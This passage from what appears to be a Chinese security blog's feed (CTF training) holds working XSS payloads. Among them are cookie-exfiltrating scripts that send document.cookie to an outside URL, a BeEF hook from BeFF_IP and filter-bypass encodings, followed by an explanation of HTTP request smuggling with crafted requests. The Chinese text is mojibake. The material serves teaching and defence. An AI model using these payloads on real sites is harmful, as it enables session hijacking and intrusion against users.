<span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://BeFF_IP:3000/book.js&quot;</span>&gt;</span><br><br>ç»•å¼€è¿‡æ»¤çš„è„šæœ¬<br>å¤§å°å†™ <span class="hljs-tag">&lt;<span class="hljs-name">ScRIpt</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPT</span>&gt;</span><br>å­—ç¬¦ç¼–ç   é‡‡ç”¨URLã€Base64 ç­‰ç¼–ç <br>javasc<span class="hljs-symbol">&amp;#x72;</span>ipt:alert(123)<br><br>æ”¶é›†ç”¨æˆ·cookie<br>æ‰“å¼€æ–°çª—å£å¹¶ä¸”é‡‡ç”¨æœ¬åœ°cookieè®¿é—®ç›®æ ‡é¡µï¼Œ<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&quot;http://www.baidu.com/cookie.php?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie<span class="hljs-string">&quot;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/cookie.php?cookie=<span class="hljs-string">&quot;+document.cookie&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/img&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;iframe src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/iframe&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;script&gt;new Image().src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie;img.width=0;img.height=0;&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.åˆ©ç”¨&lt;&gt;æ ‡è®°ï¼Œæ„é€ &lt;script&gt;æ ‡ç­¾å¯æ‰§è¡Œ javascript çš„ xss ä»£ç ã€‚</p><p>xss è¿‡æ»¤å‡½æ•°éœ€è¿‡æ»¤&lt;&gt;&lt;script&gt;&lt;/script&gt;ç­‰å­—ç¬¦ã€‚</p><p>2.åˆ©ç”¨ html æ ‡ç­¾å±æ€§æ”¯æŒ javascript:ä¼ªåè®®ï¼ˆæ”¯æŒæ ‡ç­¾å±æ€§çš„æœ‰ hrefã€lowsrcã€bgsoundã€backgroundã€valueã€actionã€dynsrc ç­‰ï¼‰ï¼Œæ‰§è¡Œ xss ä»£ç ã€‚</p><p>xss è¿‡æ»¤å‡½æ•°éœ€è¿‡æ»¤ JavaScript ç­‰å…³é”®å­—ã€‚</p><p>3.åˆ©ç”¨ javascript åœ¨å¼•å·ä¸­åªç”¨åˆ†å·åˆ†éš”å•è¯æˆ–å¼ºåˆ¶è¯­å¥ç»“æŸï¼Œç”¨æ¢è¡Œç¬¦å¿½ç•¥åˆ†å·å¼ºåˆ¶ç»“æŸä¸€ä¸ªå®Œæ•´è¯­å¥ï¼Œè€Œå¿½ç•¥å›è½¦ã€ç©ºæ ¼ã€tab ç­‰é”®ï¼Œç»•è¿‡å¯¹ javascript çš„å…³é”®å­—çš„è¿‡æ»¤ã€‚</p><p>4.åˆ©ç”¨ html æ ‡ç­¾å±æ€§å€¼æ”¯æŒ ascii ç ï¼Œå¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç è¿›è¡Œè§„åˆ™åº“çš„ç»•è¿‡ã€‚</p><p>xss è¿‡æ»¤å‡½æ•°éœ€è¿‡æ»¤&amp;#\ç­‰å­—ç¬¦ã€‚</p><p>5.åˆ©ç”¨äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œè§¦å‘äº‹ä»¶ï¼Œæ‰§è¡Œ xss ä»£ç ã€‚ä¾‹å¦‚<code>&lt;img src=&#39;#&#39; onerror=alert(/xss/)&gt;</code>,å½“æµè§ˆå™¨å“åº”é¡µé¢æ—¶ï¼Œæ‰¾ä¸åˆ°å›¾ç‰‡çš„åœ°å€ï¼Œè§¦å‘ onerror äº‹ä»¶ã€‚</p><p>6.åˆ©ç”¨ css æ‰§è¡Œ javascript ä»£ç </p><blockquote><p>css ä»£ç ä¸­åˆ©ç”¨ expression è§¦å‘ xss æ¼æ´ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>&lt;div style=â€width: expression(alert(â€˜xssâ€™));&gt;</p><p>&lt;img src=â€#â€ style=â€xss:expression(alert(/xss/));â€&gt;</p><p>&lt;style&gt;body {background-image:expression(alert(â€œxssâ€));}&lt;/style&gt;</p><p>&lt;div style=â€list-style-image:url(javascript:alert(â€˜xssâ€™))â€&gt;</p><p>css ä»£ç ä¸­åˆ©ç”¨@import è§¦å‘ xss</p><p>&lt;stytle&gt;</p><p>@import â€˜javascript:alert(â€œXSSâ€)â€™;</p><p>&lt;/stytle&gt;</p><p>css ä»£ç ä¸­ä½¿ç”¨@import å’Œ link æ–¹å¼å¯¼å…¥å¤–éƒ¨å«æœ‰ xss ä»£ç çš„æ ·å¼è¡¨æ–‡ä»¶</p><p>&lt;link rel=â€stytlesheetâ€ href=â€<a href="http://www.***.com/a.css&quot;&gt;">http://www.***.com/a.css&quot;&gt;</a></p><p>&lt;stytle type=â€™text/cssâ€™&gt;@import url(<a href="http://www.*.com/a.css);/">http://www.*.com/a.css);\</a></style></p><p>xss è¿‡æ»¤å‡½æ•°éœ€è¿‡æ»¤ style æ ‡ç­¾ã€style å±æ€§ã€expressionã€javascriptã€import ç­‰å…³é”®å­—ã€‚</p></blockquote><p>7.åˆ©ç”¨å¤§å°å†™æ··æ·†ã€ä½¿ç”¨å•å¼•å·ã€ä¸ä½¿ç”¨å¼•å·ã€ä½¿ç”¨/æ’å…¥åœ¨ img src ä¸­é—´ã€æ„é€ ä¸åŒçš„å…¨è§’å­—ç¬¦ã€è¿ç”¨/**/æ··æ·†è¿‡æ»¤è§„åˆ™æ¥ç»•è¿‡è¿‡æ»¤å‡½æ•°</p><p>8.åˆ©ç”¨å­—ç¬¦ç¼–ç ã€‚javascript æ”¯æŒ unicodeã€escapesã€åå…­è¿›åˆ¶ã€å…«è¿›åˆ¶ç­‰ç¼–ç å½¢å¼ã€‚</p><img src='#' onerror=alert(/hacked/)>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPèµ°ç§æ”»å‡»</title>
    <link href="/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-HTTPè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ"><a href="#0x01-HTTPè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ" class="headerlink" title="0x01 HTTPè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ"></a>0x01 HTTPè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ</h3><p>HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—çš„æ–¹å¼çš„æŠ€æœ¯ã€‚ä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚</p><h3 id="0x02-ä¸ºä»€ä¹ˆä¼šäº§ç”ŸHTTPè¯·æ±‚èµ°ç§"><a href="#0x02-ä¸ºä»€ä¹ˆä¼šäº§ç”ŸHTTPè¯·æ±‚èµ°ç§" class="headerlink" title="0x02 ä¸ºä»€ä¹ˆä¼šäº§ç”ŸHTTPè¯·æ±‚èµ°ç§"></a>0x02 ä¸ºä»€ä¹ˆä¼šäº§ç”ŸHTTPè¯·æ±‚èµ°ç§</h3><p><strong>è¯·æ±‚èµ°ç§æ¼æ´æˆå› </strong></p><blockquote><p>å‰ç«¯æœåŠ¡å™¨(CDN)å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶æ•°æ®ä¸åŒæ­¥ï¼Œå¼•èµ·å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´æ¼æ´çš„äº§ç”Ÿã€‚</p></blockquote><p>å¤§å¤šæ•°HTTPè¯·æ±‚èµ°ç§æ¼æ´çš„å‡ºç°æ˜¯å› ä¸ºHTTPè§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼š<code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´ã€‚<br> åŒæ—¶ä½¿ç”¨ä¸¤ç§ä¸åŒçš„æ–¹æ³•æ—¶ï¼Œ<code>Content-Length</code>æ— æ•ˆã€‚å½“ä½¿ç”¨å¤šä¸ªæœåŠ¡å™¨æ—¶ï¼Œå¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´æ—¶ï¼Œå°±ä¼šå‡ºç°æœ‰äº›æœåŠ¡å™¨è®¤ä¸º<code>Content-Length</code>çš„é•¿åº¦æœ‰æ•ˆï¼Œæœ‰äº›ä»¥<code>Transfer-Encoding</code>æœ‰æ•ˆã€‚è€Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨ä¹‹é—´ï¼Œä¼šé‡ç”¨TCPé“¾æ¥ã€‚è¿™æ ·è¶…å‡ºçš„é•¿åº¦å°±ä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚è¿›è¡Œè¯·æ±‚ï¼Œä»è€Œå¯¼è‡´HTTPè¯·æ±‚èµ°ç§æ¼æ´ã€‚</p><p><strong>RFC2616è§„èŒƒ</strong></p><blockquote><p>å¦‚æœæ¥æ”¶çš„æ¶ˆæ¯åŒæ—¶åŒ…å«ä¼ è¾“ç¼–ç å¤´å­—æ®µ(Transfer-Encoding)å’Œå†…å®¹é•¿åº¦å¤´(Content-Length)å­—æ®µï¼Œåˆ™å¿…é¡»å¿½ç•¥åè€…ã€‚</p></blockquote><p>ç”±äºè§„èŒƒé»˜è®¸å¯ä»¥ä½¿ç”¨<code>Transfer-Encoding</code>å’Œ<code>Content-Length</code>å¤„ç†è¯·æ±‚ï¼Œå› æ­¤å¾ˆå°‘æœ‰æœåŠ¡å™¨æ‹’ç»æ­¤ç±»è¯·æ±‚ã€‚æ¯å½“æˆ‘ä»¬æ‰¾åˆ°ä¸€ç§æ–¹æ³•ï¼Œå°†<code>Transfer-Encoding</code>éšè—åœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ª<code>chain</code>ä¸­æ—¶ï¼Œå®ƒå°†ä¼šå›é€€åˆ°ä½¿ç”¨<code>Content-Length</code>å»å‘é€è¯·æ±‚ã€‚</p><p><strong>èµ°ç§æ”»å‡»å®ç°</strong><br> å½“å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œä»£ç†æœåŠ¡å™¨å¯èƒ½è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p><h4 id="æ‰©å±•ï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°å¤šæ¬¡è¯·æ±‚"><a href="#æ‰©å±•ï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°å¤šæ¬¡è¯·æ±‚" class="headerlink" title="æ‰©å±•ï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°å¤šæ¬¡è¯·æ±‚"></a>æ‰©å±•ï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°å¤šæ¬¡è¯·æ±‚</h4><p>è¿™ä¸æœ€ä¸ºå¹¿æ³›çš„HTTP 1.1çš„åè®®ç‰¹æ€§â€”â€”<code>Keep-Alive&amp;Pipeline</code>æœ‰å…³ã€‚<br> åœ¨<code>HTTP1.0</code>ä¹‹å‰çš„åè®®è®¾è®¡ä¸­ï¼Œå®¢æˆ·ç«¯æ¯è¿›è¡Œä¸€æ¬¡HTTPè¯·æ±‚ï¼Œéœ€è¦åŒæœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªTCPé“¾æ¥ã€‚<br> è€Œç°ä»£çš„Webé¡µé¢æ˜¯ç”±å¤šç§èµ„æºç»„æˆçš„ï¼Œè¦è·å–ä¸€ä¸ªç½‘é¡µçš„å†…å®¹ï¼Œä¸ä»…è¦è¯·æ±‚HTMLæ–‡æ¡£ï¼Œè¿˜æœ‰JSã€CSSã€å›¾ç‰‡ç­‰å„ç§èµ„æºï¼Œå¦‚æœæŒ‰ç…§ä¹‹å‰çš„åè®®è®¾è®¡ï¼Œå°±ä¼šå¯¼è‡´HTTPæœåŠ¡å™¨çš„è´Ÿè½½å¼€é”€å¢å¤§ã€‚äºæ˜¯åœ¨<code>HTTP1.1</code>ä¸­ï¼Œå¢åŠ äº†<code>Keep-Alive</code>å’Œ<code>Pipeline</code>è¿™ä¸¤ä¸ªç‰¹æ€§ã€‚</p><p><strong>Keep-Alive</strong>ï¼šåœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´<code>Connection: Keep-Alive</code>ï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­<code>TCPé“¾æ¥</code>ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ã€‚è¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚è¿™ä¸ªç‰¹æ€§åœ¨<code>HTTP1.1</code>ä¸­é»˜è®¤å¼€å¯çš„ã€‚<br> **Pipeline(httpç®¡çº¿åŒ–)**ï¼šhttpç®¡çº¿åŒ–æ˜¯ä¸€é¡¹å®ç°äº†å¤šä¸ªhttpè¯·æ±‚ä½†ä¸éœ€è¦ç­‰å¾…å“åº”å°±èƒ½å¤Ÿå†™è¿›åŒä¸€ä¸ªsocketçš„æŠ€æœ¯ï¼Œä»…æœ‰http1.1è§„èŒƒæ”¯æŒhttpç®¡çº¿åŒ–ã€‚åœ¨è¿™é‡Œï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„<code>HTTP</code>è¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p><p>ç°åœ¨ï¼Œæµè§ˆå™¨é»˜è®¤ä¸å¯ç”¨<code>Pipeline</code>çš„ï¼Œä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½æä¾›äº†å¯¹<code>Pipleline</code>çš„æ”¯æŒã€‚<br> ä¸‹é¢è¿™æ˜¯å…¸å‹çš„CDNåŠ é€Ÿå›¾å’Œæ‹“æ‰‘ç»“æ„å›¾<br> CDNåŠ é€Ÿå›¾<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233501-56f060b8-f8cf-1.jpg"><br> æ‹“æ‰‘ç»“æ„å›¾<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233515-5f360af2-f8cf-1.png"></p><h3 id="0x03-å¦‚ä½•æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»"><a href="#0x03-å¦‚ä½•æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»" class="headerlink" title="0x03 å¦‚ä½•æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»"></a>0x03 å¦‚ä½•æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ”»å‡»</h3><p>HTTPè¯·æ±‚èµ°ç§æ”»å‡»æ¶‰åŠå°†<code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´éƒ½æ”¾ç½®åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­å¹¶è¿›è¡Œå¤„ç†ï¼Œä»¥ä¾¿å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¯·æ±‚ã€‚å®Œæˆæ­¤æ“ä½œçš„ç¡®åˆ‡æ–¹å¼å–å†³äºä¸¤ä¸ªæœåŠ¡å™¨çš„è¡Œä¸ºï¼š</p><blockquote><p>CL.TEï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ã€‚<br> TE.CLï¼šå‰ç«¯æœåŠ¡å™¨ä½¿ç”¨Transfer-Encodingæ ‡å¤´ï¼Œè€Œåç«¯æœåŠ¡å™¨ä½¿ç”¨Content-Lengthæ ‡å¤´ã€‚<br> TE.TEï¼šå‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨éƒ½æ”¯æŒTransfer-Encodingæ ‡å¤´ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¯¹æ ‡å¤´è¿›è¡ŒæŸç§æ–¹å¼çš„æ··æ·†æ¥è¯±å¯¼å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸å¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p></blockquote><h3 id="0x04-HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼"><a href="#0x04-HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼" class="headerlink" title="0x04 HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼"></a>0x04 HTTPè¯·æ±‚èµ°ç§æ”»å‡»çš„äº”ç§æ–¹å¼</h3><h4 id="CLä¸ä¸º0"><a href="#CLä¸ä¸º0" class="headerlink" title="CLä¸ä¸º0"></a>CLä¸ä¸º0</h4><p>æ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ã€‚è¿™é‡Œç”¨GETè¯·æ±‚ä¸¾ä¾‹ã€‚<br> å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼›åç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„<code>Content-Length</code>å¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚è¿™å°±æœ‰å¯èƒ½å¯¼è‡´è¯·æ±‚èµ°ç§ã€‚</p><p><strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">\r\n`æ˜¯æ¢è¡Œçš„æ„æ€ï¼Œwindowsçš„æ¢è¡Œæ˜¯`\r\n`ï¼Œunixçš„æ˜¯`\n`ï¼Œmacçš„æ˜¯`\r<br></code></pre></td></tr></table></figure></blockquote><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br> å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œè¯»å–<code>Content-Length</code>ï¼Œåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ã€‚<br> ç„¶åè½¬å‘ç»™åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œå› ä¸ºå®ƒä¸å¯¹<code>Content-Length</code>è¿›è¡Œå¤„ç†ï¼Œç”±äº<code>Pipeline</code>çš„å­˜åœ¨ï¼Œåç«¯æœåŠ¡å™¨å°±è®¤ä¸ºè¿™æ˜¯æ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><p>ç¬¬ä¸€ä¸ªï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥é€ æˆäº†è¯·æ±‚èµ°ç§ã€‚</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230è§„èŒƒ</strong></p><blockquote><p>åœ¨RFC7230çš„ç¬¬3.3.3èŠ‚ä¸­çš„ç¬¬å››æ¡ä¸­ï¼Œè§„å®šå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­åŒ…å«ä¸¤ä¸ª<code>Content-Length</code>ï¼Œè€Œä¸”ä¸¤è€…çš„å€¼ä¸åŒæ—¶ï¼Œéœ€è¦è¿”å›400é”™è¯¯ã€‚</p></blockquote><p>æœ‰äº›æœåŠ¡å™¨ä¸ä¼šä¸¥æ ¼çš„å®ç°è¯¥è§„èŒƒï¼Œå‡è®¾ä¸­é—´çš„ä»£ç†æœåŠ¡å™¨å’Œåç«¯çš„æºç«™æœåŠ¡å™¨åœ¨æ”¶åˆ°ç±»ä¼¼çš„è¯·æ±‚æ—¶ï¼Œéƒ½ä¸ä¼šè¿”å›400é”™è¯¯ã€‚<br> ä½†æ˜¯ä¸­é—´ä»£ç†æœåŠ¡å™¨æŒ‰ç…§ç¬¬ä¸€ä¸ª<code>Content-Length</code>çš„å€¼å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè€Œåç«¯æºç«™æœåŠ¡å™¨æŒ‰ç…§ç¬¬äºŒä¸ª<code>Content-Length</code>çš„å€¼è¿›è¡Œå¤„ç†ã€‚<br> <strong>æ„é€ è¯·æ±‚ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p><strong>æ”»å‡»æµç¨‹</strong>ï¼š<br> ä¸­é—´ä»£ç†æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…çš„é•¿åº¦ä¸º8ï¼Œå°†ä¸Šè¿°æ•´ä¸ªæ•°æ®åŒ…åŸå°ä¸åŠ¨çš„è½¬å‘ç»™åç«¯çš„æºç«™æœåŠ¡å™¨ã€‚<br> è€Œåç«¯æœåŠ¡å™¨è·å–åˆ°çš„æ•°æ®åŒ…é•¿åº¦ä¸º7ã€‚å½“è¯»å–å®Œå‰7ä¸ªå­—ç¬¦åï¼Œåç«¯æœåŠ¡å™¨è®¤ä¸ºå·²ç»è¯»å–å®Œæ¯•ï¼Œç„¶åç”Ÿæˆå¯¹åº”çš„å“åº”ï¼Œå‘é€å‡ºå»ã€‚è€Œæ­¤æ—¶çš„ç¼“å†²åŒºå»è¿˜å‰©ä½™ä¸€ä¸ªå­—æ¯<code>a</code>ï¼Œå¯¹äºåç«¯æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ª<code>a</code>æ˜¯ä¸‹ä¸€ä¸ªè¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰ä¼ è¾“å®Œæ¯•ã€‚<br> å¦‚æœæ­¤æ—¶æœ‰ä¸€ä¸ªå…¶ä»–çš„æ­£å¸¸ç”¨æˆ·å¯¹æœåŠ¡å™¨è¿›è¡Œäº†è¯·æ±‚ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>å› 